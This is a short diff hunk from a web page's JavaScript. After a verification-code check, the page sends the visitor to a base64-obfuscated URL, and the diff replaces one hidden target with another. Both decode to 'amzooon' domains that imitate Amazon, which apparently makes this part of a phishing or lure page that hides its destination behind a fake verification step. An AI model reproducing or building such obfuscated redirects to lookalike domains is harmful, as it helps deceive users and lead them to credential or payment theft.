@@ -199,7 +199,7 @@
             const userCode = verificationCodeInput.value;
 
             if (userCode === generatedCode) {
-                const redirectUrl = atob("aHR0cHM6Ly9hbXpvb29uLmdpdGh1Yi5pby9ob21lL0xpbmtNZWRpYUZpbGVz");
+                const redirectUrl = atob("aHR0cHM6Ly93d3cuYW16b29vbi5jb20vbGluay1tZWRpYS1maWxlcy1mdDU3ZnI1ODd1aXIyZzg3byN1dHFwM293aGVjeGI3aHVuZGZoN2p1bmVmanVscWV3a2psZXc=");
                 window.location.href = redirectUrl;
             } else {
                 attemptCount++;
